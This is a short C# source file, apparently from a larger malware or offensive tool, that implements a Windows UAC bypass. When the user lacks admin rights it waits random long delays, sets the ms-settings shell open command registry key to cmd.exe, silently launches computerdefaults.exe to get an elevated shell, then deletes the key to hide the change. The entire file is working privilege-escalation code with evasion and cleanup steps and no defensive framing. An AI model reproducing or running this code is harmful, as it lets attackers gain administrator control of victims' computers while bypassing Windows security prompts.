using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
namespace ByPaSsuAc
{
    class UAUAC
    {
        public static int Rand()
        {
            Random rand = new Random();
            int c = rand.Next(45000,800000);
            return c;
        }
        public static void Exploit()
        {
            if (!SettingItems.IsUserAnAdmin())
            {
                
                Thread.Sleep(Rand());
                ModifyReg();
                Thread.Sleep(45000);
                ReplaceReg();
                Thread.Sleep(Rand());
            }
        }

        public static void ModifyReg()
        {
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command").SetValue("", @"C:\Windows\System32\cmd.exe", RegistryValueKind.String);
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command").SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
            Registry.CurrentUser.Close();

            Process process = new Process();
            ProcessStartInfo pInfo = new ProcessStartInfo();
            pInfo.WindowStyle = ProcessWindowStyle.Hidden;
            pInfo.FileName = "cmd.exe";
            pInfo.Arguments = @"/c computerdefaults.exe";
            process.StartInfo = pInfo;
            process.Start();
            process.WaitForExit();
            
        }


        public static void ReplaceReg()
        {
            Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\ms-settings");
            Registry.CurrentUser.Close();
        }
    }
}
